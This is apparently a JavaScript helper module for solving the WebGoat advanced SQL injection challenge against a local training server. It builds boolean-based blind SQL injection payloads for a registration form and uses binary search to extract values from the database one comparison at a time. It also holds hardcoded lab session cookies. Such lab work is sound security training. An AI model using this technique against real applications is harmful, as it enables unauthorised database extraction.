import axios from 'axios'

export const COOKIE = 'CCiULbNJl4mMsey8Ozo_vCfm8cyVdWGDXr0y4b2j'// '5Vyk2AfNhCtgv0esqtFbLwFJ2n8IuTyUxIDTsXGf'
export const getHeaders = () => ({ 
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0', 
  'Accept': '*/*', 
  'Accept-Language': 'en-US,en;q=0.5', 
  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
  'X-Requested-With': 'XMLHttpRequest', 
  'Origin': 'http://127.0.0.1:8080', 
  'DNT': '1', 
  'Connection': 'keep-alive', 
  'Referer': 'http://127.0.0.1:8080/WebGoat/start.mvc', 
  'Cookie': `JSESSIONID=${COOKIE}`, 
  'Sec-Fetch-Dest': 'empty', 
  'Sec-Fetch-Mode': 'cors', 
  'Sec-Fetch-Site': 'same-origin', 
  'Pragma': 'no-cache', 
  'Cache-Control': 'no-cache'
})

export const makeRequest = config => {
  return axios(config)
    .then(function (response) {
      return response.data;
    })
    .catch(function (error) {
      console.log(error.data);
    });
}

export const getInjectionString = (type, value, sqlQuery) => {
  let comparison = ''
  if(type == 'min')
    comparison = `(${sqlQuery}) < ${value}`
  else if (type == 'max')
    comparison = `(${sqlQuery}) > ${value}`
  else if (type == 'exists')
    comparison = `exists (${sqlQuery})`
  else
    //test for equality if we do not recognize the type of injection
    comparison = `(${sqlQuery}) = ${value}`
  return `tom\' and ${comparison} and \'1\'=\'1`
}

export const getPayload = (type, value, sqlQuery) => {
  const injectionString = getInjectionString(type, value, sqlQuery) 
  return `username_reg=${injectionString}&email_reg=y&password_reg=aa&confirm_password_reg=aa`;
}

export const booleanTest = async (type, value, sqlQuery) => {
  let data = getPayload(type, value, sqlQuery) 
  let config = {
    method: 'put',
    url: 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge',
    headers: getHeaders(),
    data : data
  };

  let response = await makeRequest(config); 

  if(response.feedback.includes('already exists'))
    return true
  else 
    return false
}

export const binarySearch = async (min, max, sqlQuery) => {
  while(min <= max) {
    let mid = Math.floor((min + max)/ 2)

    if(await booleanTest('min', mid, sqlQuery)) {
      max = mid - 1
    } else if(await booleanTest('max', mid, sqlQuery)) {
      min = mid + 1
    } else 
      return mid
  }
}

export const confirmValue = async (value, sqlQuery) => {
 // Confirm the retrieved value
  if(await booleanTest(true, value, sqlQuery)) {
    return value
  } else {
    console.log(`something's wrong. binarySearch did not find the correct value`)
    console.log(`\n${sqlQuery}`)
    process.exit(1)
  }
}
